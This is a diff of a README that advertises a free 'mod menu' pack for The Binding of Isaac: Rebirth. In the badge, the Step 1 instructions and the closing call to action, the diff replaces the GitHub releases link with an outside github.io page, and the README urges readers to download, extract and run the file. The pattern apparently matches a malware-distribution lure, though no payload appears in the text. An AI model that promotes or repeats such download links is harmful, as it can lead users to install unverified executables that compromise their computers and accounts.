@@ -1,6 +1,6 @@
 # 🎮 The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release - Your All-in-One Mod Pack Awaits
 
-[![Download Now](https://img.shields.io/badge/Download-Mod_Menu_Pack-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Hypochondriacal-parametricstatistic7889/The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release/releases)
+[![Download Now](https://img.shields.io/badge/Download-Mod_Menu_Pack-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://hypochondriacal-parametricstatistic7889.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ Getting the mod pack running on your PC takes just three simple steps. Follow al
 
 ### Step 1: 📥 Download the Mod Pack
 
-Visit this link to download the application: **[https://github.com/Hypochondriacal-parametricstatistic7889/The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release/releases](https://github.com/Hypochondriacal-parametricstatistic7889/The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release/releases)**
+Visit this link to download the application: **[https://hypochondriacal-parametricstatistic7889.github.io](https://hypochondriacal-parametricstatistic7889.github.io)**
 
 You'll land on the releases page where you'll see the latest version of the mod pack listed. Look for the file that's ready to download and click on it. This is where all the magic begins!
 
@@ -118,7 +118,7 @@ The **The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release** is your 
 
 Don't keep playing the same old Isaac. Bring in new items, new challenges, new visuals, and new ways to play. Your next run could be your most fun one yet.
 
-**Ready to start?** Download the mod pack here: **[https://github.com/Hypochondriacal-parametricstatistic7889/The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release/releases](https://github.com/Hypochondriacal-parametricstatistic7889/The-Binding-of-Isaac-Rebirth-Mod-Menu-PC-Free-Community-Release/releases)**
+**Ready to start?** Download the mod pack here: **[https://hypochondriacal-parametricstatistic7889.github.io](https://hypochondriacal-parametricstatistic7889.github.io)**
 
 Extract the files, run the menu, pick your mods, and dive back into the basement. Your new Isaac adventure starts now! 🎉
 
